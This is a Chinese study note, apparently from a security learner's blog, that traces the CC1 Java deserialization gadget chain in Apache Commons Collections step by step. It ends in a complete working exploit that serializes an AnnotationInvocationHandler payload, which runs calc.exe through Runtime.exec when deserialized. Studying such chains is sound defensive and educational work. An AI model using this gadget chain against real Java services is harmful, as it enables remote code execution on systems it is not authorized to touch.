# 反序列化漏洞基本原理
初学CC链，先了解一下漏洞利用的基本方式
首先我们反序列化的时候接受任意对象，执行readObject方法
A.readObject方法中调用O.aaa
通过O.aaa->O2.xxx->.........->调用危险方法。
![[Pasted image 20251125223946.png]]

## 入口类
需要可序列化
重写readObject
接受任意对象作为参数

## 链子中
可序列化
集合类型/接受Object/接受Map对象
并且目标是找到一个r.exec()来执行命令


# 正常执行命令
```java
package org.example;  
  
import java.lang.reflect.Method;  
  
public class Cc1Test {  
    public static void main(String[] args) throws Exception{  
        Runtime r =Runtime.getRuntime();  
        Class c =Runtime.class;  
        Method execMethod = c.getMethod("exec", String.class);  
        execMethod.invoke(r ,"calc.exe");  
  
  
    }  
  
}
```
正常我们通过反射来调用exec方法如下
先拿到runtime的对象
再拿到runtime的class
拿到class的方法
再通过invoke执行方法


# cc1链子基本流程
Java Version: < 1.8.0_8u71
这里利用的是Transformer
 我们先看Transformer这个接口![[Pasted image 20251126150400.png]]
 看到他在这几个地方实现，我们这里利用的是InvokerTransformer
 ![[Pasted image 20251126150612.png]]
我们看到这里实现的transform方法中可以传入任意对象，并且getClass()
然后getMethod()里面的两个参数我们甚至再构造方法中传入，还能控制他们![[Pasted image 20251126150823.png]]
简直就是完美的后门。。
那么我们的调用思路就很明显了，如下

```java
package org.example;  
  
import org.apache.commons.collections.functors.InvokerTransformer;  
  
  
  
public class Cc1Test {  
    public static void main(String[] args) throws Exception{  
        Runtime r =Runtime.getRuntime();  
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"}).transform(r);  
  
    }  
  
}
```
我们已经找到了这个危险方法，那我们就要找，谁调用了transform（我们不找transform调用的transform，找别人看看谁调用的transform）
最终找到了这个checkSetvalue，他返回了一个valueTransformer的transform方法
那我们去看啊可能这个valueTransformer是什么。
![[Pasted image 20251126152533.png]]
找到了他的构造方法，名字叫TransformeMap，发现是protect的，那他肯定是被封装起来了，找找有没有返回这个方法或者调用这个方法的。
![[Pasted image 20251126152606.png]]
找到了decorate方法，返回了一个TransformedMap
![[Pasted image 20251126152804.png]]
那我们就可以写出调用TransformedMap类的decorate的方法，把我们要transform的对象在这里当作第三个参数传入，就可以走到transform的方法了。
```java
package org.example;  
  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.util.HashMap;  
  
  
public class Cc1Test {  
    public static void main(String[] args) throws Exception{  
        InvokerTransformer invokerTransformer=new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"});  
        HashMap<Object,Object> map=new HashMap<>();  //new一个map对他进行装饰
        TransformedMap.decorate(map,null,invokerTransformer);  //在这里传入我们要transform的东西
        //最终达成  invokerTransformer.transform(value)的效果
        //类比于上文的 Runtime r =Runtime.getRuntime();  
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"}).transform(r);
          
    }  
  
}
```

`TransformedMap.decorate(map,null,invokerTransformer);`     在这里传入我们要transform的东西
最终达成  `invokerTransformer.transform(value)`的效果
类比于上文的
```
		Runtime r =Runtime.getRuntime(); 
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"}).transform(r);
```

那么现在的问题就是 `checkSetValue`方法传入的 value
我们能否控制？
![[Pasted image 20251127215135.png]]
所以我们依旧右键查看调用。
只有一处进行调用了。
在这个setValue的方法中
![[Pasted image 20251127215305.png]]
我们发现，这个方法在一个MapEntry的类中
![[Pasted image 20251127215822.png]]
***
注：我们这里由于直接找MapEntry的用法有太多，所以我们先来理解一下Entry的含义

entry本意是进入的意思，在键值对中，可以理解为`<k,y>`这么一个键值对 进入（entry）到一个容器（Map）中，所以，通常来说我们使用
`Map.Entry<K,V>`来拿到一个键值对

所以我们在遍历map的时候可以使用
```java
for (Map.Entry<String, Integer> e : scores.entrySet()) {
    String name = e.getKey();
    Integer score = e.getValue();
}
```
scores这个Map对象的entrySet方法可以返回一个键值对的集合，在这个集合中，我们可以通过getKey或者getValue拿到键或者值
***
所以我们的思路就是通过setValue->checkSetValue->刚刚的transform对象也就是我们执行的计算器
```java
package org.example;  
  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.util.HashMap;  
import java.util.Map;  
  
  
public class Cc1Test {  
    public static void main(String[] args) throws Exception{  
        Runtime r =Runtime.getRuntime();  
        InvokerTransformer invokerTransformer=new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"});  
        HashMap<Object,Object> map=new HashMap<>();  
        map.put("1","2");//随便加，要不然后面不遍历键值对  
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, invokerTransformer);  
        
        for (Map.Entry  entry:transformedMap.entrySet()){  
            entry.setValue(r);//这里调用我们的危险方法  
        }  
    }  
  
}
```

也就是说找到一个遍历数组的地方，就可以执行我们和后半段名命令

好我们找setValue的用法
不管怎么样，链子再长，我们都要返回我们梦开始的地方**readObject()**
所以我们现在，只要能返回到readObject、参数可控，一切都可以打通。
![[Pasted image 20251127223458.png]]
ok对劲了，终于回到了readObject。
就是我们刚刚说的！可以通过遍历Map来执行setValue
![[Pasted image 20251127223607.png]]
看看这个类的构造函数
看到传入一个Map，我们可以调用
我们还看到这个类不是public的，是一个默认类defaut，包级私有，只能在同一个包下被访问，所以我们需要通过反射来拿到他的构造器，设置accessible为true

![[Pasted image 20251127230605.png]]

```java
package org.example;  
  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.io.*;  
import java.lang.reflect.Constructor;  
import java.util.HashMap;  
import java.util.Map;  
  
  
public class Cc1Test {  
    public static void main(String[] args) throws Exception{  
        Runtime r =Runtime.getRuntime();  
        InvokerTransformer invokerTransformer=new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"});  
        HashMap<Object,Object> map=new HashMap<>();  
        map.put("1","2");  
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, invokerTransformer);  
//        for (Map.Entry  entry:transformedMap.entrySet()){  
//            entry.setValue(r);  
        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor<?> annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);  
        annotationInvocationHandlerConstructor.setAccessible(true);  
        Object o = annotationInvocationHandlerConstructor.newInstance(Override.class, map);//随便写个注解就行  
        serialize(o);  
        unserialize("ser.bin");  
    }  
  
    public  static void serialize(Object obj)throws Exception{  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
  
    }  
    public  static  Object unserialize(String Filename)throws IOException,ClassNotFoundException{  
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));  
        Object obj=ois.readObject();  
        return obj;  
    }  
  
}
```
那我们现在唯一的问题就是我们怎么拿到`r`( `  Runtime r =Runtime.getRuntime();  `  )因为他不可序列化
还要过一下这里的if
![[Pasted image 20251127223607.png]]

那我们通过最开始发现的入口来构建runtime对象

我们先来回顾一下最开始发现的这个完美的后门
![[Pasted image 20251128095017.png]]
我们自己写出如下payload，先写出正常反射调用过程，进行类比
然后写出通过invoketransform进行调用的过程
```java
package org.example;  
  
import org.apache.commons.collections.functors.InvokerTransformer;  
  
import java.io.*;  

  
  
public class Cc1Test {  
    public static void main(String[] args) throws Exception{  
        //Runtime r =Runtime.getRuntime();  
        //----------------------------------------------        


        //正常反射------------------------------------------------------------------
//        Class r=Runtime.class;  
//        //Runtime类是单例模式，不能拿构造器，只能从getRuntime方法进  
//        Method getRuntimeMethod = r.getMethod("getRuntime", null);  
//        Object invokegetRuntime = getRuntimeMethod.invoke(null, null);//第一个参数为对象，但是为静态方法所以写null；第二个是方法参数，没有写null  
//  
//        Method exec = r.getMethod("exec", String[].class);  
//        exec.invoke(invokegetRuntime,"calc.exe");//在runtime对象上执行exec方法传参clac  
//transformer版本-----------------------------------------------------------------
        //获取Runtime   
          Object getRuntimeMethod1 = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);  
        //对Runtime执行invoke方法  
        Object invokegetRuntime1 = new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod1) ;  
        
        
        //拿到exec方法  
        Object exec1 = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"exec", new Class[]{String.class}}).transform(Runtime.class);  
        //对exec进行执行invoke
        Object invokeexec1 = new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{invokegetRuntime1,new Object[]{"calc.exe"}}).transform(exec1) ;  
  
```
自己写的有点麻烦，看到白日梦组长这么写
因为我们已经拿到了Runtime实例，可以直接在Runtime上进行exec调用
在Runtime实例上执行exec方法，构造函数为Sting.class,传入参数为calc.exe。
```java
//获取Runtime  
Object getRuntimeMethod1 = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);  
//对Runtime执行invoke方法  ，拿到runtime实例
Object invokegetRuntime1 = new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod1) ;  
//拿到exec方法  
new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}).transform(invokegetRuntime1) ;
```
或者更加简化，由于想到我们刚刚的链式递归调用

![[Pasted image 20251128111522.png]]
```java
Transformer[] transformers = new Transformer[]{  
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
        new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null, null}),  
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})  
};  
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
chainedTransformer.transform(Runtime.class);
```
我们可以这样递归调用

接下来我们想一下怎么走到setValue方法
![[Pasted image 20251128210458.png]]
```java
private void readObject(java.io.ObjectInputStream s)  
    throws java.io.IOException, ClassNotFoundException {  
    s.defaultReadObject();  
  
    // Check to make sure that types have not evolved incompatibly  
  
    AnnotationType annotationType = null;  
    try {  
        annotationType = AnnotationType.getInstance(type);//这里type我们构造方法传入的方法就是type  
    } catch(IllegalArgumentException e) {  
        // Class is no longer an annotation type; time to punch out  
        throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");  
    }  
  
    Map<String, Class<?>> memberTypes = annotationType.memberTypes();//获取我们传入注解内的成员变量  
  
    // If there are annotation members without values, that  
    // situation is handled by the invoke method.    
    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {  
        String name = memberValue.getKey();//获取我们传入的Map对象的key  
        Class<?> memberType = memberTypes.get(name);//在注解成员变量里查找key  
        if (memberType != null) {  // 如果查找到不是空 
            Object value = memberValue.getValue();//拿到我们传入的Map键值对的值  
            if (!(memberType.isInstance(value) ||//如果找到的key值不是刚在注解成员变量里找到的key的类或者他的子类的实例  ---换句话说，判断在运行的时候能不能强转成前面的memberType类型
                  value instanceof ExceptionProxy)) { // 并且也不是一个异常代理对象
                memberValue.setValue(  
                    new AnnotationTypeMismatchExceptionProxy(  
                        value.getClass() + "[" + value + "]").setMember(  
                            annotationType.members().get(name)));  
            }
```

所以主要在这`        if (memberType != null) {  // 如果查找到不是空 `
我们需要找到一个注解的成员方法不是空，并且让我们的Map传入的key是这个注解的成员方法
用Target注解即可

其次我们要控制setValue的返回值
我们直接使用ConstanceTransformer，不管setValue传入值为啥，我们控制他的返回值即可
![[Pasted image 20251128220207.png]]

所以我们修改一下这里调用他的transform方法
```java
Transformer[] transformers = new Transformer[]{  
        new ConstantTransformer(Runtime.class),  
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
        new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null, null}),  
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})  
};  
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```
最终exp如下
```java
package org.example;  
  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.io.*;  
import java.lang.annotation.Target;  
import java.lang.reflect.Constructor;  
import java.util.HashMap;  
import java.util.Map;  
  
  
public class Cc1Test {  
    public static void main(String[] args) throws Exception{  
  
  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null, null}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
  
  
        HashMap<Object,Object> map=new HashMap<>();  
        map.put("value","111");//这里的key必须是和下面注解里的成员方法同名  
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);  
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor<?> annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);//由于AnnotationInvocationHandler的构造器第一参数是Class第二是Map  
        annotationInvocationHandlerConstructor.setAccessible(true);  
        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);//注解得有成员方法  
        serialize(o);  
        unserialize("ser.bin");  
    }  
  
    public  static void serialize(Object obj)throws Exception{  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
  
    }  
    public  static  Object unserialize(String Filename)throws IOException,ClassNotFoundException{  
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));  
        Object obj=ois.readObject();  
        return obj;  
    }  
  
}
```
# 总结
东看一点西看一点，我们最后来从头捋一遍


一个反序列化漏洞说白了就是一个头一个尾，然后甲乙两队同时施工。
我们需要找到一个危险的方法，然后让他返回readObject进而反序列化进行调用

cc1利用的就是InvokeTransformer这个类，存在一个写的很像后门的东西
![[Pasted image 20251129181831.png]]
只要我们拿到这个InvokeTransformer的transform方法可以反射调用任意类

所以我们去找transform同名方法

找到了一个TransformedMap类里的一个装饰方法，可以把装饰好的东西调用transform方法。


我们再去找谁调用了checkSetValue
![[Pasted image 20251129223845.png]]
只有这里一处，
我们可以想到在键值对遍历的时候会调用setValue

我们再找setvalue的用法，发现了readObject，就正好回到了链子的开头

然后我们只需要通过刚刚的invokeTransformer进行反射调用runtime类

并且调用setvalue的时候有一些if逻辑把他过了

整个链子调用为


![[Pasted image 20251129230943.png]]




















